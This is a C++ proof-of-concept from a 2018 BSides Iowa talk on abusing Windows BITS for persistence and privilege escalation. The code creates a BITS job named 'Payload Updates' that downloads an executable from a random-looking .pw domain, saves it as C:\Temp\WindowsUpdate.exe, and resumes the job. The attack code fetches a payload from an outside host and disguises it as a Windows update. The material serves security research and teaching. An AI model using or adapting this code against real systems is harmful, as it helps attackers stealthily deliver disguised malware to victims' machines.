/*! BITS_PoC.cpp : Background Intelligent Transfer Service (BITS) proof-of-concept
* (PoC) code for BSides Iowa presentation by Dan O'Day and Ilya Kobzar on April 14,
* 2018 entitled "BITS and pieces: Abusing BITS for persistence and privilege
* escalation".
*
* ********************************************************************************
* Based on code released under the Microsoft Public License obtained from
* https://msdn.microsoft.com/en-us/library/hh994437%28v=vs.85%29.aspx
*
* Copyright (c) Microsoft. All rights reserved.
* This code is licensed under the Microsoft Public License.
* THIS CODE IS PROVIDED *AS IS* WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR
* IMPLIED, INCLUDING ANY IMPLIED WARRANTIES OF FITNESS FOR A PARTICULAR PURPOSE,
* MERCHANTABILITY, OR NON-INFRINGEMENT.
* ********************************************************************************
*
* A note from Dan O'Day:
*
* This is an abysmal proof-of-concept for the purpose of the talk. I would never
* use goto statements and would certainly use smart pointers (ATL/CComPtr FTW) in
* lieu of raw, C-style pointers if I were writing something more robust; blame
* Microsoft for the majority of the code in this example. Note that this requires
* BITS 5.0.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "stdafx.h"
#include <windows.h>
#include <winnt.h>
#include <bits.h>
#include <bits5_0.h>


int _tmain()
{
	HRESULT hr = S_OK;
	GUID guidJob;
	IBackgroundCopyJob5* pBackgroundCopyJob5;
	IBackgroundCopyJob* pBackgroundCopyJob;
	IBackgroundCopyManager* pQueueMgr;
	BITS_JOB_PROPERTY_VALUE propval;

	// Specify the COM threading model
	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (SUCCEEDED(hr))
	{
		// The impersonation level must be at least RPC_C_IMP_LEVEL_IMPERSONATE
		hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
			RPC_C_AUTHN_LEVEL_CONNECT,
			RPC_C_IMP_LEVEL_IMPERSONATE,
			NULL, EOAC_NONE, 0);

		if (SUCCEEDED(hr))
		{
			hr = CoCreateInstance(__uuidof(BackgroundCopyManager),
				NULL,
				CLSCTX_LOCAL_SERVER,
				__uuidof(IBackgroundCopyManager),
				(void **)&pQueueMgr);

			if (FAILED(hr))
			{
				// Failed to connect to BITS
				wprintf(L"Failed to connect to BITS with error %x\n", hr);
				goto done;
			}

			// Create a BITS job
			wprintf(L"Creating Job...\n");

			hr = pQueueMgr->CreateJob(L"Payload Updates",
				BG_JOB_TYPE_DOWNLOAD,
				&guidJob,
				(IBackgroundCopyJob **)&pBackgroundCopyJob);

			if (FAILED(hr))
			{
				wprintf(L"Failed to Create Job, error = %x\n", hr);
				goto cancel;
			}

			wprintf(L" Job was succesfully created ...\n");

			// set the transfer policy for the job to exclude metered connections
			propval.Dword = BITS_COST_STATE_UNRESTRICTED;

			hr = pBackgroundCopyJob->QueryInterface(
				__uuidof(IBackgroundCopyJob5),
				reinterpret_cast<void**>(&pBackgroundCopyJob5)
			);

			if (FAILED(hr))  // fails here every time with error code 80004002
			{
				wprintf(L"Failed to Create Job, error = %x\n", hr);
				goto cancel;
			}
			pBackgroundCopyJob5->SetProperty(BITS_JOB_PROPERTY_ID_COST_FLAGS, propval);

			// Get the Transfer Policy for the new job.
			BITS_JOB_PROPERTY_VALUE actual_propval;

			wprintf(L"Getting TransferPolicy Property ...\n");

			hr = pBackgroundCopyJob5->GetProperty(BITS_JOB_PROPERTY_ID_COST_FLAGS,
				&actual_propval);
			if (FAILED(hr))
			{
				// SetSSLSecurityFlags failed.
				wprintf(L"GetProperty failed with error %x\n", hr);
				goto cancel;
			}

			// Add payload to BITS job
			pBackgroundCopyJob->AddFile(L"http://fjaz52wff88sg0c.pw/WindowsUpdate.exe", L"C:\\Temp\\WindowsUpdate.exe");

			DWORD job_transferpolicy = actual_propval.Dword;
			wprintf(L"get TransferPolicy Property returned %#x\n", job_transferpolicy);

			pBackgroundCopyJob->Resume();
		}
	done:
		CoUninitialize();
	}
	return 1;

cancel:
	pBackgroundCopyJob->Cancel();
	pBackgroundCopyJob->Release();
	goto done;
}
